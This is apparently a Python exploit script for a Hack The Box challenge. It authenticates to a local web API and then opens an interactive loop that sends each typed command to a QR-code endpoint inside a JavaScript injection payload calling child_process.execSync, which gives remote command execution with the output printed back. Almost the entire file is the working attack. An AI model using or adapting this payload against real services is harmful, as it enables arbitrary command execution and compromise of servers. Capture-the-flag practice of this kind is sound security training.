#!/usr/bin/python3

import requests
import json

server="localhost"
port=5000

url=f"http://{server}:{port}"
auth_endpoint=f"{url}/api/auth/authenticate"
qr_endpoint=f"{url}/api/service/generate"

headers = {"Content-Type": "application/json"}
data = {"email": "test@hackthebox.com"}

response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))

token = response.json()['token']

while True:
    user_input = input("> ")
    user_input = user_input.replace("'", '"')
    payload={ "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"}
    # print(payload)

    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
    response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))

    output = response.json()['message'].split("The input \"")[1][:-2]
    print(output)